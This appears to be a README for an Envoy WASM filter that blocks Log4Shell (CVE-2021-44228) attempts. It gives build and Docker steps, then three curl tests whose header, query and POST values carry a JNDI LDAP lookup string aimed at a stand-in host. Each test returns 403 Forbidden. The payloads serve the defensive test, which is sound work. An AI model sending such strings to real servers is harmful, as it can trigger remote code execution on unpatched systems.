This compiles an example filter for envoy WASM.

# build filter
build with
```
bazel build :filter.wasm
cp -f bazel-bin/filter.wasm .
```

Filter will be in:
```
./bazel-bin/filter.wasm
```

# build config descriptors

build descriptors with:
```
bazel build :filter_proto
```

Descriptors will be in:
```
./bazel-bin/filter_proto-descriptor-set.proto.bin
```

Note: 
on a mac, please run
```
xcode-select --install
```

and Potentially:
```
brew install python@2
```
as the python bundled with catalina may have issues with ssl certs.
# run filter in docker
```
docker run --rm -ti -p 10002:10002 -v "$(pwd):/mnt/data/" -v "$(pwd)/filter.wasm:/mnt/data/filter/filter.wasm" docker.io/envoyproxy/envoy:v1.20.0 --component-log-level "wasm:debug" -c /mnt/data/filter.yaml
```
#test
## Using a header
```
curl -v -H "x-my-header: \${jndi:ldap://foo.bar/x}" http://127.0.0.1:10002/headers
```
```
*   Trying 127.0.0.1:10002...
* Connected to 127.0.0.1 (127.0.0.1) port 10002 (#0)
> GET /headers HTTP/1.1
> Host: 127.0.0.1:10002
> User-Agent: curl/7.77.0
> Accept: */*
> x-my-header: ${jndi:ldap://foo.bar/x}
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< content-length: 56
< content-type: text/plain
< date: Wed, 15 Dec 2021 22:02:27 GMT
< server: envoy
<
* Connection #0 to host 127.0.0.1 left intact
Potential Remote Command Execution: Log4j CVE-2021-44228%
```
## Using a param
```
curl -v -X GET  http://127.0.0.1:10002/headers?arg-1=\$\\{jndi:ldap://foo.bar/x\\}
```
```

Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 127.0.0.1:10002...
* Connected to 127.0.0.1 (127.0.0.1) port 10002 (#0)
> GET /headers?arg-1=${jndi:ldap://foo.bar/x} HTTP/1.1
> Host: 127.0.0.1:10002
> User-Agent: curl/7.77.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< content-length: 56
< content-type: text/plain
< date: Wed, 15 Dec 2021 22:03:59 GMT
< server: envoy
<
* Connection #0 to host 127.0.0.1 left intact
Potential Remote Command Execution: Log4j CVE-2021-44228%
```
## Using POST
```
curl -v -X POST -d "arg-1=\${jndi:ldap://foo.bar/x}" http://127.0.0.1:10002/headers
```
```
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 127.0.0.1:10002...
* Connected to 127.0.0.1 (127.0.0.1) port 10002 (#0)
> POST /headers HTTP/1.1
> Host: 127.0.0.1:10002
> User-Agent: curl/7.77.0
> Accept: */*
> Content-Length: 31
> Content-Type: application/x-www-form-urlencoded
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< content-length: 56
< content-type: text/plain
< date: Wed, 15 Dec 2021 22:04:42 GMT
< server: envoy
< connection: close
<
* Closing connection 0
Potential Remote Command Execution: Log4j CVE-2021-44228%
```